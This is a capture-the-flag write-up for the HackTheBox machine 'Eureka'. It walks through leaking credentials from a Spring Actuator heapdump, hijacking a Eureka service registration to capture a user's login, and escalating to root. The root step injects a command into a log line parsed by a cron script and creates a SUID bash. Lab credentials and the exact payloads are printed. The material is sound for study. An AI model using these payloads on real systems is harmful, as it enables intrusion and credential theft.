---
icon: brain-circuit
---

# HTB-EUREKA

<figure><img src="../../../../.gitbook/assets/image (450).png" alt=""><figcaption></figcaption></figure>

### Attack Flow Explanation

**Initial Access**

1. While enumerating the target, a **Spring Boot web application** was identified running on `furni.htb`.
2. Directory brute forcing revealed the **/actuator/heapdump** endpoint, which allowed me to download a **heap memory dump** of the running Java application.
3. I analyzed the heap dump using **VisualVM** and extracted **hardcoded MySQL credentials** (`oscar190:0sc@r190_S0l!dP@sswd`).
4. These credentials were not only valid for the database but also reused for **SSH access**, granting me an initial shell as the low-privileged user `oscar190`.

**Privilege Escalation**\
5\. With limited access, I continued enumeration and discovered that port **8761 (Eureka Service Discovery)** was open.\
6\. Recursive searches inside `/var/www/web` revealed an **application.yaml** configuration file containing valid **Eureka service credentials** (`EurekaSrvr:0scarPWDisTheB3st`).\
7\. Using these credentials, I logged into the **Eureka dashboard** and learned about the registered microservices.\
8\. By manipulating the **USER-MANAGEMENT-SERVICE** JSON configuration, I replaced its backend instance with my own malicious instance pointing to my attacker-controlled machine.\
9\. This redirection caused authentication attempts to hit my listener, where I captured credentials for another user: **miranda-wise** (`IL!veT0Be&BeT0L0ve`).\
10\. Logging in as `miranda-wise`, I retrieved the **user flag**.

**Root Privilege Escalation**\
11\. Further enumeration revealed a script `/opt/log_analyse.sh`, which was periodically executed by **cron as root**.\
12\. Reviewing its source showed insecure parsing of HTTP status codes using regex and variable evaluation, leaving it vulnerable to **command injection**.\
13\. Since `miranda-wise` belonged to the developers group with write access to the log directory, I replaced the log file with a malicious entry:\
`HTTP Status: x[$(<COMMAND>)]`\
14\. When processed by the cron job, the injected command was executed with **root privileges**.\
15\. I used this to copy `/bin/bash` to `/tmp` and set the **SUID bit**, giving me a root shell.\
16\. With root access, I successfully collected the **final flag**.

***

## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d6:b2:10:42:32:35:4d:c9:ae:bd:3f:1f:58:65:ce:49 (RSA)
|   256 90:11:9d:67:b6:f6:64:d4:df:7f:ed:4a:90:2e:6d:7b (ECDSA)
|_  256 94:37:d3:42:95:5d:ad:f7:79:73:a6:37:94:45:ad:47 (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://furni.htb/
8761/tcp open  http    Apache Tomcat (language: en)
|_http-title: Site doesn't have a title.
| http-auth:
| HTTP/1.1 401 \x0D
|_  Basic realm=Realm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The Nmap scan revealed two HTTP services, with port 80 redirecting to furni.htb. I added this domain entry to the /etc/hosts file for proper resolution

## Initial Access <a href="#initial-access" id="initial-access"></a>

<figure><img src="../../../../.gitbook/assets/image (451).png" alt=""><figcaption></figcaption></figure>

The web application hosted on furni.htb is an online furniture store where users can create accounts, log in, and manage shopping carts. The purchase process functions as expected, and no immediate vulnerabilities were observed during initial interaction.

A directory brute-force scan performed with ffuf uncovered several endpoints, including /actuator/heapdump. The Actuator endpoints indicate that the application is running on Spring, which provides production-ready features such as log access, health checks, and various system metrics. The /heapdump endpoint, in particular, exposes a complete memory dump of the application’s heap.

### FFUF

<pre class="language-bash"><code class="lang-bash">sn0x㉿sn0x)-[~/HTB/Eureka]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt \
       -u http://furni.htb/FUZZ
 
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
 
       v2.1.0-dev
________________________________________________
 
 :: Method           : GET
 :: URL              : http://furni.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________
 
<strong>actuator/heapdump       [Status: 200, Size: 80165337, Words: 0, Lines: 0, Duration: 0ms]
</strong><strong>actuator                [Status: 200, Size: 2129, Words: 1, Lines: 1, Duration: 373ms]
</strong>error                   [Status: 500, Size: 73, Words: 1, Lines: 1, Duration: 773ms]
login                   [Status: 200, Size: 1550, Words: 195, Lines: 28, Duration: 394ms]
--- SNIP ---
</code></pre>

After downloading the heapdump using wget, I analyzed it with VisualVM, a tool designed for inspecting Java heap dumps. Searching for the keyword "database" in the objects view revealed multiple references within the com.mysql package, suggesting that the application is backed by a MySQL database. Further inspection of the DatabaseMetaData object exposed the database connection string, including hardcoded credentials: `oscar190:0sc@r190_S0l!dP@sswd.`

<figure><img src="../../../../.gitbook/assets/image (452).png" alt=""><figcaption></figcaption></figure>

The extracted database credentials were also valid for SSH access. Using them, I successfully obtained a shell on the target system as the user oscar190.

## Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

### Shell as miranda-wise <a href="#shell-as-miranda-wise" id="shell-as-miranda-wise"></a>

The current user (oscar190) has limited privileges, with no sudo access and no membership in any interesting groups. From the initial Nmap scan, I also noted that port 8761 was open, which is commonly associated with the Netflix Eureka service registry, though it required basic authentication.

By recursively searching for passwords within the web directory (/var/www/web), I located a configuration file at Eureka-Server/target/classes/application.yaml. This file contained credentials for the Eureka service: username EurekaSrvr and password 0scarPWDisTheB3st, which are used to authenticate and interact with the registry.

`/var/www/web/Eureka-Server/target/classes/application.yaml`

```bash

spring:
  application:
    name: "Eureka Server"
 
  security:
    user:
      name: EurekaSrvr
      password: 0scarPWDisTheB3st
 
server:
  port: 8761
  address: 0.0.0.0
 
eureka:
  client:
    register-with-eureka: false
    fetch-registry: false

```

* Navigated to `http://furni.htb:8761`, which hosts the Eureka service registry.
* The service prompted for basic authentication.
* Supplied the credentials recovered from the `application.yaml` configuration file.
* Successfully gained access to the Eureka service dashboard.

<figure><img src="../../../../.gitbook/assets/image (453).png" alt=""><figcaption></figcaption></figure>

* Researched online and found a blog post describing how application routing can be influenced via the Eureka REST API.
* Launched Burp Suite, intercepted a request containing the `Authorization` header, and sent a `GET` request to `/eureka/v2/apps`.
* The response listed all registered applications along with their configurations.
* By default, the API returned XML, but setting the `Accept: application/json` header changed the output format to JSON.
* Among the listed services, the **USER-MANAGEMENT-SERVICE** appeared most interesting.
* Queried its configuration by appending `/USER-MANAGEMENT-SERVICE` to the request.
* The response showed that the service runs a single instance, routed internally to `localhost:8081`.

<figure><img src="../../../../.gitbook/assets/image (454).png" alt=""><figcaption></figcaption></figure>

* Extracted the JSON configuration data for the **USER-MANAGEMENT-SERVICE** instance.
* Modified the `hostName` and `ipAddr` fields to point to my own IP address.
* Sent a `POST` request to the Eureka application endpoint with the modified JSON payload.
* Successfully replaced the legitimate service instance with my malicious one, allowing interception of traffic intended for the original application.

```python
POST /eureka/v2/apps/USER-MANAGEMENT-SERVICE HTTP/1.1
Host: furni.htb:8761
Accept: application/json
Authorization: Basic RXVyZWthU3J2cjowc2NhclBXRGlzVGhlQjNzdA==
Content-Type: application/json
Content-Length: 1480
 
 
{
    "instance": {
        "instanceId": "localhost:USER-MANAGEMENT-SERVICE:8081",
        "hostName": "10.10.10.10",
        "app": "USER-MANAGEMENT-SERVICE",
        "ipAddr": "10.10.10.10",
        "status": "UP",
        "overriddenStatus": "UNKNOWN",
        "port": {
            "$": 8081,
            "@enabled": "true"
        },
        "securePort": {
            "$": 443,
            "@enabled": "false"
        },
        "countryId": 1,
        "dataCenterInfo": {
            "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
            "name": "MyOwn"
        },
        "leaseInfo": {
            "renewalIntervalInSecs": 30,
            "durationInSecs": 90,
            "registrationTimestamp": 1747813679747,
            "lastRenewalTimestamp": 1747824108225,
            "evictionTimestamp": 0,
            "serviceUpTimestamp": 1747813679748
        },
        "metadata": {
            "management.port": "8081"
        },
        "homePageUrl": "http://localhost:8081/",
        "statusPageUrl": "http://localhost:8081/actuator/info",
        "healthCheckUrl": "http://localhost:8081/actuator/health",
        "vipAddress": "USER-MANAGEMENT-SERVICE",
        "secureVipAddress": "USER-MANAGEMENT-SERVICE",
        "isCoordinatingDiscoveryServer": "false",
        "lastUpdatedTimestamp": "1747813679748",
        "lastDirtyTimestamp": "1747813677361",
        "actionType": "ADDED"
    }
}
```

* Set up a listener on port `8081` to capture incoming connections.
* After some time, received a connection attempt redirected from the manipulated Eureka instance.
* The request included login credentials for the user **miranda.wise**.
* Extracted the password: `IL!veT0Be&BeT0L0ve` (observed in URL-encoded form).

```bash
sn0x㉿sn0x)-[~/HTB/Eureka]
└─$ nc -lnvp 8081
listening on [any] 8081 ...
connect to [10.10.10.10] from (UNKNOWN) [10.129.34.236] 40868
POST /login HTTP/1.1
X-Real-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1,127.0.0.1
X-Forwarded-Proto: http,http
Content-Length: 168
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.8
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: SESSION=MWJlMjQ3Y2EtZTc3ZC00NmVmLWEyNTQtMGIyOTMyZDk1NmY2
User-Agent: Mozilla/5.0 (X11; Linux x86_64)
Forwarded: proto=http;host=furni.htb;for="127.0.0.1:35888"
X-Forwarded-Port: 80
X-Forwarded-Host: furni.htb
host: 10.10.10.10:8081
 
username=miranda.wise%40furni.htb&password=IL%21veT0Be%26BeT0L0ve&_csrf=CwCAwUnbSQsa1P749uIEEgsVblUO309_Vn2M8wnxfScg3JJYOTe3833jLWk3sMeeks8wKjlxQ2xtvXxSb0m7xDmXSR5F5KNv
```

* Initially, the captured password did not work with SSH or `su` for the username `miranda.wise`.
* Checked `/etc/passwd` and discovered that the correct system account name was `miranda-wise`.
* Retried authentication using the corrected username and the previously captured password.
* Successfully switched to the `miranda-wise` account and retrieved the first user flag.

### Shell as root <a href="#shell-as-root" id="shell-as-root"></a>

Inside the /opt directory, I discovered a Bash script named log\_analyse.sh. I suspected that this script might be executed on a scheduled basis, so I uploaded pspy to monitor system processes in real time. Running pspy confirmed that the script is indeed executed periodically by the root user via cron.

```bash
$ ./pspy64
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d
 
 
     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░
                   ░           ░ ░
                               ░ ░
 
Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
--- SNIP ---
2025/05/21 10:58:01 CMD: UID=0     PID=512173 | /usr/sbin/CRON -f
2025/05/21 10:58:01 CMD: UID=0     PID=512175 | /bin/sh -c /opt/scripts/log_cleanup.sh
2025/05/21 10:58:01 CMD: UID=0     PID=512176 | /bin/sh -c /opt/scripts/log_cleanup.sh
2025/05/21 10:58:01 CMD: UID=0     PID=512179 | sleep 10
2025/05/21 10:58:01 CMD: UID=0     PID=512178 | /bin/sh /opt/scripts/log_cleanup.sh
2025/05/21 10:58:01 CMD: UID=0     PID=512177 | /bin/sh /opt/scripts/log_cleanup.sh
2025/05/21 10:58:01 CMD: UID=0     PID=512180 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log
2025/05/21 10:58:01 CMD: UID=0     PID=512182 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
2025/05/21 10:58:01 CMD: UID=0     PID=512181 | /usr/sbin/CRON -f
2025/05/21 10:58:01 CMD: UID=0     PID=512183 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log
2025/05/21 10:58:01 CMD: UID=0     PID=512184 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
2025/05/21 10:58:01 CMD: UID=0     PID=512185 | /bin/sh -c /opt/scripts/miranda-Login-Simulator.sh
2025/05/21 10:58:01 CMD: UID=0     PID=512186 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log
2025/05/21 10:58:01 CMD: UID=0     PID=512187 |
2025/05/21 10:58:01 CMD: UID=0     PID=512190 |
2025/05/21 10:58:01 CMD: UID=0     PID=512189 | /bin/bash /opt/log_analyse.sh /var/www/web/user-management-service/log/application.log
2025/05/21 10:58:01 CMD: UID=0     PID=512188 | /bin/bash /opt/log_analyse.sh /var/www/web/cloud-gateway/log/application.log
--- SNIP ---
```

Reviewing the source code of the `log_analyse.sh` script revealed several checks performed on the provided log file input. One notable function, analyze\_http\_statuses, parses the file line by line, extracts HTTP status codes using a regex, and stores the result in a variable named code. Later in the script, this variable is compared against another within an if statement. This construct introduces the potential for command injection, as under certain conditions the contents of the variable may be evaluated rather than treated as plain text.

`/opt/log_analyse.sh`

<pre class="language-bash"><code class="lang-bash">#!/bin/bash
 
# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
RESET='\033[0m'
 
LOG_FILE="$1"
OUTPUT_FILE="log_analysis.txt"
 
declare -A successful_users  # Associative array: username -> count
declare -A failed_users      # Associative array: username -> count
STATUS_CODES=("200:0" "201:0" "302:0" "400:0" "401:0" "403:0" "404:0" "500:0") # Indexed array: "code:count" pairs
 
if [ ! -f "$LOG_FILE" ]; then
    echo -e "${RED}Error: Log file $LOG_FILE not found.${RESET}"
    exit 1
fi
 
 
analyze_logins() {
    # Process successful logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${successful_users[$username]+_}" ]; then
            successful_users[$username]=$((successful_users[$username] + 1))
        else
            successful_users[$username]=1
        fi
    done &#x3C; &#x3C;(grep "LoginSuccessLogger" "$LOG_FILE")
 
    # Process failed logins
    while IFS= read -r line; do
        username=$(echo "$line" | awk -F"'" '{print $2}')
        if [ -n "${failed_users[$username]+_}" ]; then
            failed_users[$username]=$((failed_users[$username] + 1))
        else
            failed_users[$username]=1
        fi
    done &#x3C; &#x3C;(grep "LoginFailureLogger" "$LOG_FILE")
}
 
 
analyze_http_statuses() {
    # Process HTTP status codes
    while IFS= read -r line; do
<strong>        code=$(echo "$line" | grep -oP 'Status: \K.*')
</strong>        found=0
        # Check if code exists in STATUS_CODES array
        for i in "${!STATUS_CODES[@]}"; do
            existing_entry="${STATUS_CODES[$i]}"
            existing_code=$(echo "$existing_entry" | cut -d':' -f1)
            existing_count=$(echo "$existing_entry" | cut -d':' -f2)
<strong>            if [[ "$existing_code" -eq "$code" ]]; then
</strong>                new_count=$((existing_count + 1))
                STATUS_CODES[$i]="${existing_code}:${new_count}"
                break
            fi
        done
    done &#x3C; &#x3C;(grep "HTTP.*Status: " "$LOG_FILE")
}
 
 
analyze_log_errors(){
     # Log Level Counts (colored)
    echo -e "\n${YELLOW}[+] Log Level Counts:${RESET}"
    log_levels=$(grep -oP '(?&#x3C;=Z  )\w+' "$LOG_FILE" | sort | uniq -c)
    echo "$log_levels" | awk -v blue="$BLUE" -v yellow="$YELLOW" -v red="$RED" -v reset="$RESET" '{
        if ($2 == "INFO") color=blue;
        else if ($2 == "WARN") color=yellow;
        else if ($2 == "ERROR") color=red;
        else color=reset;
        printf "%s%6s %s%s\n", color, $1, $2, reset
    }'
 
    # ERROR Messages
    error_messages=$(grep ' ERROR ' "$LOG_FILE" | awk -F' ERROR ' '{print $2}')
    echo -e "\n${RED}[+] ERROR Messages:${RESET}"
    echo "$error_messages" | awk -v red="$RED" -v reset="$RESET" '{print red $0 reset}'
 
    # Eureka Errors
    eureka_errors=$(grep 'Connect to http://localhost:8761.*failed: Connection refused' "$LOG_FILE")
    eureka_count=$(echo "$eureka_errors" | wc -l)
    echo -e "\n${YELLOW}[+] Eureka Connection Failures:${RESET}"
    echo -e "${YELLOW}Count: $eureka_count${RESET}"
    echo "$eureka_errors" | tail -n 2 | awk -v yellow="$YELLOW" -v reset="$RESET" '{print yellow $0 reset}'
}
 
 
display_results() {
    echo -e "${BLUE}----- Log Analysis Report -----${RESET}"
 
    # Successful logins
    echo -e "\n${GREEN}[+] Successful Login Counts:${RESET}"
    total_success=0
    for user in "${!successful_users[@]}"; do
        count=${successful_users[$user]}
        printf "${GREEN}%6s %s${RESET}\n" "$count" "$user"
        total_success=$((total_success + count))
    done
    echo -e "${GREEN}\nTotal Successful Logins: $total_success${RESET}"
 
    # Failed logins
    echo -e "\n${RED}[+] Failed Login Attempts:${RESET}"
    total_failed=0
    for user in "${!failed_users[@]}"; do
        count=${failed_users[$user]}
        printf "${RED}%6s %s${RESET}\n" "$count" "$user"
        total_failed=$((total_failed + count))
    done
    echo -e "${RED}\nTotal Failed Login Attempts: $total_failed${RESET}"
 
    # HTTP status codes
    echo -e "\n${CYAN}[+] HTTP Status Code Distribution:${RESET}"
    total_requests=0
    # Sort codes numerically
    IFS=$'\n' sorted=($(sort -n -t':' -k1 &#x3C;&#x3C;&#x3C;"${STATUS_CODES[*]}"))
    unset IFS
    for entry in "${sorted[@]}"; do
        code=$(echo "$entry" | cut -d':' -f1)
        count=$(echo "$entry" | cut -d':' -f2)
        total_requests=$((total_requests + count))
 
        # Color coding
        if [[ $code =~ ^2 ]]; then color="$GREEN"
        elif [[ $code =~ ^3 ]]; then color="$YELLOW"
        elif [[ $code =~ ^4 || $code =~ ^5 ]]; then color="$RED"
        else color="$CYAN"
        fi
 
        printf "${color}%6s %s${RESET}\n" "$count" "$code"
    done
    echo -e "${CYAN}\nTotal HTTP Requests Tracked: $total_requests${RESET}"
}
 
 
# Main execution
analyze_logins
analyze_http_statuses
display_results | tee "$OUTPUT_FILE"
analyze_log_errors | tee -a "$OUTPUT_FILE"
echo -e "\n${GREEN}Analysis completed. Results saved to $OUTPUT_FILE${RESET}"


</code></pre>

Since some of the logs were generated through interaction with the web application, I realized I could inject my own code into them. However, while exploring further, I noticed that the user miranda-wise is part of the developers group and has write permissions on the directory where the log file is stored. Although I couldn’t directly edit the log file, I was able to delete and recreate it.

To exploit this, I inserted the line HTTP Status: x\[$(\<COMMAND>)] into the recreated log file. This format satisfies the regex pattern used by the script, which extracts everything after "Status:" into the variable code. When the script later evaluates this variable in an if statement, the command inside the sub-shell is executed. I leveraged this behavior to copy the Bash binary into /tmp and assign it the SUID bit, setting up a path for privilege escalation

```bash
$ cd /var/www/web/cloud-gateway/log/
 
$ ls -la .
total 32
drwxrwxr-x 2 www-data developers  4096 May 21 12:10 .
drwxrwxr-x 6 www-data developers  4096 Mar 18 21:17 ..
-rw-rw-r-- 1 www-data www-data   21254 May 21 12:10 application.log
 
$ rm application.log 
rm: remove write-protected regular file 'application.log'? yes
 
$ echo 'HTTP Status: x[$(cp /bin/bash /tmp/bash && chmod u+s /tmp/bash)]' > application.log
 
$ ls -la /tmp/bash
-rwsr-xr-x 1 root root 1183448 May 21 12:12 /tmp/bash
```

On the next cron execution, the modified log file was processed by the script, triggering the injected command. This allowed me to successfully escalate privileges to root and retrieve the final flag.

<figure><img src="../../../../.gitbook/assets/complete.gif" alt=""><figcaption></figcaption></figure>
